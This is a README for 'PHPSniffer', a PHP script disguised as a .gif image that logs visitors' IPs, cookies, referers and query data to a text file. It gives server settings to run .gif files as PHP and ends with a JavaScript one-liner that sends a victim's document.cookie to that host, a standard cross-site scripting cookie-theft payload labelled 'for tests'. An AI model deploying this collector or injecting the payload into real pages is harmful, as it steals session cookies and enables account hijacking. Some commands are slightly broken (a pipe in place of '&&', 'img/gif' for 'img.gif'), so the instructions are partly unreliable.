PHPSniffer
==========

Simple PHP script to receive GET data and log it to txt file.

#### Install ####

Clone from GIT:

```git clone https://github.com/codebyzen/PHPSniffer```

Change rights & rename:
```mv img.php ing.gif | chmod +x ./img.gif```

To setup your Apache server use .htaccess
```AddType application/x-httpd-php .gif```

or if PHP as CGI
```AddHandler application/x-httpd-php .gif```

If you use NGINX use below location config:
```
location ~ /path/.*\.(gif|jpg|png)$ {
	fastcgi_index index.php;
	include /Applications/MAMP/conf/nginx/fastcgi_params; # just for example maybe like fastcgi_params
	fastcgi_pass unix:/Applications/MAMP/Library/logs/fastcgi/nginxFastCGI_php7.2.8.sock; # just for example maybe like /tmp/fastcgi.sock
	fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
```

Create log file and set propper rights:

```touch log.txt | chmod 777 log.txt```

##### Simple Log File #####
```Access time, IP, Server-Cookie, Cookie, Referer, User-Agent, Host, Query-String```


#### Usage ####
You can direct access to script file `http://site.tld/path/img.gif` after that you see little smile face. If all ok log.txt file will appended with your ip, ua, time and other.
To pass the useful data use GET parametres: `http://site.tld/path/img.gif?c=simple%20data%you%20need`. Data from `c` wil be added to log.
If you don't need smile face image, set `i=1` param to output 1x1 transparent pixel.

Simple JS script for tests:
```i=new/**/Image();i.src='http://host/path/img/gif?c='+escape(document.cookie)+'&i=1';```
